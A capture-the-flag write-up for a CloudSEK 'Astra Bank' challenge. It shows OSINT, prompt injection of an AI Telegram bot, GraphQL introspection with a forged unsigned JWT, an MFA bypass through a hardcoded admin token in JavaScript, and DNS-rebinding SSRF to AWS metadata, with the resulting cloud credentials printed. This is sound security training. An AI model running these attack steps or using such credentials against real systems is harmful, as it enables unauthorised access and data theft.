# Astra Bank CTF Report

**Author:** Jaswanth Sunkara (`kick`)
**Date:** 24-08-2025

---
## Welcome Challenge - Flag 1

![[Pasted image 20250823100731.png|500]]

```
suryanandanmajumder@gmail.com
```

### Challenge Description

Astra Bank has been hit by a massive cyberattack. The attackers left no clear trace behind. CloudSEK analysts discovered that the email `suryanandanmajumder@gmail.com` was used by the attacker. The mission was to continue the investigation and uncover hidden secrets at each step.

### Approach

1. **OSINT Recon:**
    - Initiated an email search using OSINT techniques.
    - Googled `"email osnit online"` and discovered the website [epieos.com](https://epieos.com)
    - Searched the email address on the site, which returned three links: **Google Maps**, **Google Calendar**, and **Google Plus Archive**.

![[Pasted image 20250823100829.png]]
 
 2. **Analyzing the Results:**
    - Google Calendar and Archive contained no useful information.
    - Google Maps review contained a **GitHub link** embedded within a review image. 

![[Pasted image 20250823100906.png|300]]

3. **Following the GitHub Trail:**
    - Navigated to the GitHub repository linked from the Maps review.
    - Checked the commit history and carefully inspected each commit.
    - Found the flag in one of the commit messages.

![[Pasted image 20250823100944.png|600]]

![[Pasted image 20250823101106.png|300]]

![[Pasted image 20250823101050.png]]

### Flag

```
CloudSEK{Flag_1_w3lc0m3_70_7h3_c7f}
```

---
## Hacking the Hacker - Flag 2

### Challenge Description

The investigation continued from the previous step. The GitHub repository discovered in the Google Maps review contained code, hinting at further hidden clues. The task was to analyze the repository for potential leads.

### Approach

1. **Inspecting the Repository:**
    
    - Opened the repository linked from the previous step.
    - Carefully reviewed the code files and commit history for anything unusual.
    
2. **Identifying the Telegram Bot:**
    
    - Found a Python script in the repository controlling a Telegram bot.
    - Noticed the bot token placeholder referencing `@ChaturIndiaBot`.
    - Also spotted a comment indicating a secret flag reference using:

```
os.getenv('FLAG_2_URL')
```

![[Pasted image 20250824102707.png]]

3. **Following the Bot:**

- Searched for `@ChaturIndiaBot` on Telegram.
- I understood this has to be *Prompt Injection* from the python script as script contained *gemini-2.5-flash* references
- Interacting with the bot led to the discovery of the second flag.

![[Pasted image 20250823103936.png]]

- Decoding the ASCII code gave the link to pastebin

```
[72, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 47, 116, 90, 67, 87, 80, 99, 54, 84]
```

```bash
python3 -c "print(''.join(chr(int(x)) for x in '72 116 116 112 115 58 47 47 112 97 115 116 101 98 105 110 46 99 111 109 47 114 97 119 47 116 90 67 87 80 99 54 84'.split())) )"
```

```
https://pastebin.com/raw/tZCWPc6T
```

![[Pasted image 20250823104039.png]]
- First link provided an audio file, which is a *morse code tone*

![[Pasted image 20250823104100.png|500]]
- I googled "online morse decoder" and found the below website. But the output was not the flag.

![[Pasted image 20250823104126.png|600]]

```
FLAG2!W3!H473!AI!B07I -- incorrect
```

- Tried with different website: https://morsecodegenerator.org/morse-audio-translator

![[Pasted image 20250823104645.png|600]]

### Flag

```
CloudSEK{FLAG2!W3!H473!AI!B07S}
```

---
## Attacking the Infrastructure - Flag 3

### Description

The Pastebin link from the previous challenge (`https://pastebin.com/raw/tZCWPc6T`) pointed us to a BeVigil report for an Android app:

```
https://bevigil.com/report/com.strikebank.easycalculator
```

![[Pasted image 20250823130029.png|600]]

### Approach

1. **Exploring BeVigil Report**

- After logging into BeVigil and reviewing the app analysis report, I noticed **two important findings**:
- ignored google API key, probably Google Maps API key.

![[Pasted image 20250823130352.png]]

- Hardcoded strings inside the app’s `strings.xml` file.    
- An exposed endpoint: 

![[Pasted image 20250824111026.png]]

![[Pasted image 20250824111106.png|400]]

```xml
<string name="base_url">http://15.206.47.5:9090</string>
```

```xml
<string name="graphql">/graphql</string>
```

- There was also about firebase, I tried simple reading the data unauthenticated, it resulted nothing useful, and didn't purse it further.


2. **GraphQL Introspection**

- I had troubles with setting up burpsuite on wayland initially, so meanwhile I tried with curl. 
- I used the below basic Introspection query.

```bash
curl -X POST http://15.206.47.5:9090/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name:\"Query\") { fields { name type { name kind ofType { name kind } } } } }"}'
```

```json
{"data":{"__type":{"fields":[{"name":"showSchema","type":{"kind":"SCALAR","name":"String","ofType":null}},{"name":"listUsers","type":{"kind":"LIST","name":null,"ofType":{"kind":"OBJECT","name":"UserShort"}}},{"name":"userDetail","type":{"kind":"OBJECT","name":"Detail","ofType":null}},{"name":"getMail","type":{"kind":"SCALAR","name":"String","ofType":null}},{"name":"getNotes","type":{"kind":"LIST","name":null,"ofType":{"kind":"SCALAR","name":"String"}}},{"name":"getPhone","type":{"kind":"LIST","name":null,"ofType":{"kind":"OBJECT","name":"UserContact"}}},{"name":"generateToken","type":{"kind":"SCALAR","name":"String","ofType":null}},{"name":"databaseData","type":{"kind":"SCALAR","name":"String","ofType":null}},{"name":"dontTrythis","type":{"kind":"SCALAR","name":"String","ofType":null}},{"name":"BackupCodes","type":{"kind":"SCALAR","name":"String","ofType":null}}]}}}
```

- I tried with query field `generateToken`
- It generated a guest token for username: `John.d`

```bash
curl -X POST http://15.206.47.5:9090/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ generateToken }"}'
```

```json
{"data":{"generateToken":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6Ilg5TDdBMlEiLCJ1c2VybmFtZSI6ImpvaG4uZCJ9."}}
```

- I queried the users using the below command. We are able to retrieve usernames and  IDs without any authentication.

```bash
 curl -X POST http://15.206.47.5:9090/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ listUsers { id username } }"}'
```

```json
{"data":{"listUsers":[{"id":"X9L7A2Q","username":"john.d"},{"id":"M3ZT8WR","username":"bob.marley"},{"id":"T7J9C6Y","username":"charlie.c"},{"id":"R2W8K5Z","username":"r00tus3r"}]}}
```

-  I retrieved the Schema using the below query field.

```bash
curl -X POST http://15.206.47.5:9090/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ showSchema }"}'
```

```
type Address {
  city: String
  region: String
  country: String
}

type Credentials {
  username: String
  password: String
}

type Detail {
  first_name: String
  last_name: String
  email: String
  phone: String
  bio: String
  role: String
  address: Address
  notes: [String]
  credentials: Credentials
  flag: String
  profile: String
}

type UserShort {
  id: ID!
  username: String
}

type UserContact {
  username: String
  phone: String
}

type Query {
  showSchema: String

  listUsers: [UserShort]
  userDetail(id: ID!): Detail
  getMail(id: ID!): String
  getNotes: [String]
  getPhone: [UserContact]

  generateToken: String

  databaseData(
    filter: String
    limit: Int
    deepScan: Boolean
    token: String
    format: String
    path: String
  ): String

  dontTrythis(
    user: String
    hint: String
    attempt: Int
    verbose: Boolean
    timestamp: String
  ): String

  BackupCodes(
    requester: String
    emergencyLevel: Int
    method: String
    signature: String
    expiry: String
  ): String
}
```

- I modified the guest token with `r00tus3r` ID and username and copied the modified token. Since there was no encryption it was easy modification.

![[Pasted image 20250824113415.png|280]]

![[Pasted image 20250824124050.png|400]]

- `userDetail` retrieves user details along with the flag and takes user `id` as argument.

```
curl -X POST http://15.206.47.5:9090/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6IlIyVzhLNVoiLCJ1c2VybmFtZSI6InIwMHR1czNyIn0." \
  -d '{"query":"{ userDetail(id:\"R2W8K5Z\") { flag } }"}'
```

```
{"data":{"userDetail":{"flag":"CloudSEK{Flag_3_gr4phq1_!$_fun}"}}}
```

![[Pasted image 20250823134658.png]]

- We also got email and password, I copied it in my notes, could be used later.
- I took note of the `role` as "Platform Administrator". I thought maybe there could be system Administrator or Administrator roles but that wasn't the case.
- I tried to gather more info by using other query fields like "`getNotes`, `getMail`, `getPhone`, `DatabaseData` and `DontTrythis`" but they weren't useful.

### Flag

```
CloudSEK{Flag_3_gr4phq1_!$_fun}
```

---
## Bypassing Authentication - Flag 4

### Description

From the previous challenge, we discovered a endpoint for Flag 4. Initially I did not query all the details of the `r00tus3r` user. Took a break and came back and as I was reviewing through my notes it occurred to me that I didn't retrieve all the details of the user.

```
http://15.206.47.5:5000
```

![[Pasted image 20250823160832.png]]

```
{ "address": { "city": "Boston", "country": "US", "region": "MA" }, "bio": "Devops Engineer", "credentials": { "password": "l3t%27s%20go%20guys$25", "username": "r00tus3r" }, "email": "alice.wright@example.com", "first_name": "Alice", "flag": "CloudSEK{Flag_3_gr4phq1_!$_fun}", "last_name": "Wright", "notes": [ "privileged account", "monitoring enabled" ], "phone": "+1-617-555-9999", "profile": "[http://15.206.47.5:5000/](http://15.206.47.5:5000/ "http://15.206.47.5:5000/")", "role": "Platform Administrator" }
```

### Approach

1. **Login**
- I used the username and password I got from previous challenge.

```
r00tus3r
l3t%27s%20go%20guys$25
```


![[Pasted image 20250824160924.png]]


![[Pasted image 20250823164000.png]]

2. **Javascript Analysis**
- Initially I quickly opened and closed the js file, thought it wasn't relevant. 

![[Pasted image 20250824140624.png]]

-  After trying various methods to bypass mfa/backup code. I copied the source and gave it to chatGPT and it indicated about *js* which I initially paid no attention. Then I looked at it again and found the lead.

```javascript
document.addEventListener("DOMContentLoaded", () => {
    const e = document.getElementById("form-title"),
        t = document.getElementById("login-form"),
        n = document.getElementById("mfa-section"),
        a = document.getElementById("login-msg"),
        o = document.getElementById("username"),
        s = document.getElementById("password"),
        i = document.getElementById("mfa-code"),
        r = document.getElementById("backup-code"),
        d = document.getElementById("profile-name"),
        c = document.getElementById("profile-pic"),
        l = document.getElementById("profile-role"),
        u = document.getElementById("profile-upload"),
        m = document.getElementById("dash-flag"),
        p = document.getElementById("logout-btn"),
        y = document.getElementById("upload-btn"),
        g = document.getElementById("toggle-password");
    async function f(e, t) {
        const n = undefined;
        return (await fetch("/api/login", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                username: e,
                password: t
            })
        })).json()
    }
    async function h(e, t) {
        const n = undefined;
        return (await fetch("/api/mfa", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                mfa_code: e,
                backup_code: t
            })
        })).json()
    }
    async function w(e) {
        const t = "YXBpLWFkbWluOkFwaU9ubHlCYXNpY1Rva2Vu",
            n = undefined;
        return (await fetch("/api/admin/backup/generate", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                Authorization: `Basic ${t}`
            },
            body: JSON.stringify({
                user_id: user_id
            })
        })).json()
    }
    async function b() {
        const e = await fetch("/api/profile");
        return 403 === e.status ? (window.location.href = "/login", null) : e.json()
    }
    async function E(e) {
        const t = await fetch("/api/profile/upload_pic", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                Accept: "*/*"
            },
            body: JSON.stringify({
                image_url: e
            })
        });
        if (!t.ok) try {
            const e = undefined;
            return {
                error: (await t.json()).error || "Failed to fetch resource"
            }
        } catch {
            return {
                error: `Failed (HTTP ${t.status})`
            }
        }
        const n = await t.blob(),
            a = undefined;
        return {
            blob: n,
            contentType: t.headers.get("Content-Type") || n.type || "application/octet-stream"
        }
    }

    function v(e) {
        return new Promise((t, n) => {
            const a = new FileReader;
            a.onerror = () => n(new Error("Failed to read blob")), a.onloadend = () => t(a.result), a.readAsDataURL(e)
        })
    }
    async function L() {
        await fetch("/api/logout", {
            method: "POST"
        }), window.location.href = "/login"
    }
    g ? .addEventListener("click", () => {
        "password" === s.type ? (s.type = "text", g.textContent = "🙈") : (s.type = "password", g.textContent = "👁")
    }), document.getElementById("login-btn") ? .addEventListener("click", async() => {
        const d = await f(o.value, s.value);
        "success" === d.status ? window.location.href = "/dashboard" : "mfa_required" === d.status ? (t.style.display = "none", n.style.display = "block", n.removeAttribute("aria-hidden"), e && (e.innerText = "Multi-Factor Authentication"), (i || r) ? .focus()) : (a.innerText = d.message || "Wrong username or password", a.classList.add("show"))
    });
    const I = document.getElementById("tab-auth"),
        T = document.getElementById("tab-backup"),
        k = document.getElementById("panel-auth"),
        B = document.getElementById("panel-backup");

    function x(e) {
        const t = "backup" === e;
        I ? .setAttribute("aria-selected", String(!t)), T ? .setAttribute("aria-selected", String(t)), k ? .classList.toggle("active", !t), B ? .classList.toggle("active", t), B ? .setAttribute("aria-hidden", String(!t)), k ? .setAttribute("aria-hidden", String(t)), (t ? r : i) ? .focus()
    }
    I ? .addEventListener("click", () => x("auth")), T ? .addEventListener("click", () => x("backup"));
    const S = document.getElementById("mfa-btn"),
        A = document.getElementById("mfa-btn-backup");
    async function O() {
        const e = await b();
        e && (d && (d.innerText = `${e.first_name} ${e.last_name} (@${e.username})`), c && (c.src = e.profile_pic), l && (l.innerText = e.role), m && (m.innerText = e.flag))
    }
    S ? .addEventListener("click", async() => {
        const e = await h((i ? .value || "").trim(), "");
        "success" === e.status ? window.location.href = "/dashboard" : (a.innerText = e.message || "Invalid MFA/backup code", a.classList.add("show"))
    }), A ? .addEventListener("click", async() => {
        const e = await h("", (r ? .value || "").trim());
        "success" === e.status ? window.location.href = "/dashboard" : (a.innerText = e.message || "Invalid MFA/backup code", a.classList.add("show"))
    }), [i, r].forEach(e => {
        e ? .addEventListener("keydown", e => {
            "Enter" === e.key && (B ? .classList.contains("active") ? A ? .click() : S ? .click())
        })
    }), document.getElementById("back-to-login") ? .addEventListener("click", () => {
        n.style.display = "none", n.setAttribute("aria-hidden", "true"), t.style.display = "flex", e && (e.innerText = "Sign In")
    }), p ? .addEventListener("click", L), y ? .addEventListener("click", async() => {
        const e = document.getElementById("dash-msg");
        e.classList.remove("show", "alert-error", "alert-success"), e.innerText = "";
        const t = u ? .value.trim();
        if (!t) return e.innerText = "Please enter a URL.", void e.classList.add("show", "alert-error");
        const n = await E(t);
        if (n.error) return e.innerText = n.error, void e.classList.add("show", "alert-error");
        try {
            const t = await v(n.blob),
                a = new Image;
            a.onload = function() {
                c && (c.src = t), e.innerText = "Profile picture updated!", e.classList.add("show", "alert-success")
            }, a.onerror = function() {
                e.innerText = "Please provide a valid image.", e.classList.add("show", "alert-error")
            }, a.src = t
        } catch {
            e.innerText = "Failed to process response.", e.classList.add("show", "alert-error")
        }
    }), [o, s, i, r].forEach(e => {
        e ? .addEventListener("input", () => {
            a.classList.remove("show"), a.innerText = ""
        })
    }), u ? .addEventListener("input", () => {
        const e = document.getElementById("dash-msg");
        e.classList.remove("show", "alert-error", "alert-success"), e.innerText = ""
    }), "/dashboard" === window.location.pathname && O()
});
```

- `Authorization: Basic YXBpLWFkbWluOkFwaU9ubHlCYXNpY1Rva2Vu`  
- Base64-decoded > `api-admin:ApiOnlyBasicToken`
- Below part of the code is crucial. We can use it to generate backup code by providing *user_id* as argument with admin basic authentication token.

```javascript
async function w(e) {
	const t = "YXBpLWFkbWluOkFwaU9ubHlCYXNpY1Rva2Vu",
		n = undefined;
	return (await fetch("/api/admin/backup/generate", {
		method: "POST",
		headers: {
			"Content-Type": "application/json",
			Authorization: `Basic ${t}`
		},
		body: JSON.stringify({
			user_id: user_id
		})
	})).json()
}
```

3. **Generate backup codes**
- I needed user ID for user `r00tus3r` but the ID I got in the previous challenge didn't work here.

![[Pasted image 20250824161019.png]]

- I decoded the the cookie value (jwt) and got the *user_id*

```
eyJsb2dnZWRfaW4iOmZhbHNlLCJ1c2VyX2lkIjoiZjJmOTY4NTUtOGMwNS00NTk5LWE5OGMtZjdmMmZkNzE4ZmEyIiwidXNlcm5hbWUiOiJyMDB0dXMzciJ9.aKrrCw.EghNTMHsWK0g4-DjVYpuyWglVN0
```

![[Pasted image 20250824160358.png]]

- Used that *user_id* to generate backup_codes.

![[Pasted image 20250823171205.png]]

- Used backup code to login

![[Pasted image 20250823171307.png]]

- After logging in we got the flag.

![[Pasted image 20250823171517.png]]

### Flag

```
CloudSEK{Flag_4_T0k3n_3xp0s3d_JS_MFA_Byp4ss}
```

---
## The Final Game - Flag 5

### Description

It is a DNS rebind SSRF vulnerability on aws.

### Procedure

1. **Information gathering**
- I looked at source and took note of aws bucket URL and assumed it could be cloud related challenge.

![[Pasted image 20250824004520.png]]

- After trying with multiple SSRF vulnerabilites:
	- Single redirection - not worked
	- Looked for any open redirect endpoint - not found
	-  Http headers - not worked
	- `null` and boolean (`true`) as values - not worked
	- DNS rebind - worked
- I used `169.254.169.254` as second IP as it the local IP for aws since we already assumed it could be related to cloud.

![[Pasted image 20250824005944.png]]

![[Pasted image 20250824005806.png]]

2. **Exploitation**
- After finding the vulnerability. I started gathering bucket credentials. 

![[Pasted image 20250823230600.png]]

![[Pasted image 20250823230531.png]]

3. **Configure aws**

```bash
aws configure set aws_access_key_id ASIA4A3BVGI342AHBPXL
```

```bash
aws configure set aws_secret_access_key/sB67CVsp5560hd4C2cow9qgtXHYLV23YqGZm4Hr
```

```bash
aws configure set aws_session_token "IQoJb3JpZ2luX2VjENn//////////wEaCmFwLXNvdXRoLTEiRjBEAiAQiec8WjEDWKMlolTwFiZB/t9sMU3cJTEXLbQwQKCCfgIgZOj9DRRCjyADE1jypXixQMq5gyqZkfXHdMqEpV54iwYqtgUIMhAAGgw4MjY0NDkxNDY0MjMiDCGTR0vMkkydDW/CuiqTBfjg/vJ+3EUflLOVtZwUBzLjhSqDxy/FHE18/Z609bAi/TIJWhIPvt86P57rKMf74GMCT+WY7yygWpfq3srthTYWrUmsinS9Ci5CiLKyD3/kgjLPTuAFN+gXoak1VEgBQDTX8nPiHgllCyBGrzT4pr6TkZWX7oNd1CK6US16goO13/J9hFjIVZF616Qkml3dCv/cWJPLq7Il0muzVgqdtmfwF7lN3rCVKZaqUFuLffz3cUuHTMS9dTNZqm1lSob7QdWKrUYhVAzmVvnp5xJOvUD2HoWtl643lGrJkgB6dkW74sC6zPdcAPTUFGPY3uzQRUuNAC4aPg7uOVwIUceHQM0PQDSol+PdOd8rv0kWwlqvKIF1Fx87SJtuCM8ig7mabIW3UA7u9bIaySrvZmERqQObrmlZekRPr+s/oo/0ZADlwLvrWp3RW8SwojXHPi67mPIsLA54WtS+e001SB5aCpqLdwwRuPYZjKDDPB5qQQ6NgGm6UTcJf1ldIr3YPkZv7XXjEJR9dENVzqA3wbasWxJbsi+0nBVhNzHPGa/opnaUyrggG6vLt08lJyU5+DaVc2vYlXQt7085Z1wkdDQz4Q5pgakFDXpTUrSdSdTofKLLlbO5kNsdeQVO7fHbyU0cI+5nwvTq+NZ33+YyyqzC6rb28mHaQs+uaUtgRm8/7w3ZqLkD1q7sfWMnGaDJ5TZf148qIvPGCB4Odt5XbL96Y7GqQ+Z5zW1ndjmACmqIQrOOCdWrqu2NqtB0cDg0ghtiAiz7yUVwUhX9hbogktTUXuq/5n+oDrUaGtAZ6HvynB0l6OC3/J9b8LgJqiVS+rN4l3UyO5WqpqfBgjm+AC1RnSVGynrk4OBA52PxX1sZ8+Pg1ntnMMHkp8UGOrIBgXkVycF4Qa7mgewkEKl1w2VuqAs9X232MmKdfnEKFdLqu6Sag97BshOnKnDl8wkdX7PMML9RG0rMvp/8RzfmHx1jDUBZq183LQQ4Ypm5wL8IbubA1cmiJsp2nVASX0JYsObOKzjB60PBRoUt/C0WdZ0NcRjlTalz/P47LlShdBBIiG0Py8na/RY+cMbfa6wgx8Yt1N1ps1ULsU2kcppsKbmGKkfjZOpEoFLfr16YyMX3yw=="
```

```bash
aws configure set default.region ap-south-1
```

4. **Finding the flag**

```bash
aws s3 ls s3://cloudsek-ctf/ --region ap-south-1 
```

```
                           PRE static-assets/
2025-08-21 15:30:43         42 flag.txt
```

```bash
aws s3 cp s3://cloudsek-ctf/flag.txt ./flag.txt --region ap-south-1
```

![[Pasted image 20250824001728.png]]

### Flag

```
CloudSEK{Flag_5_$$rf_!z_r34lly_d4ng3r0u$}
```

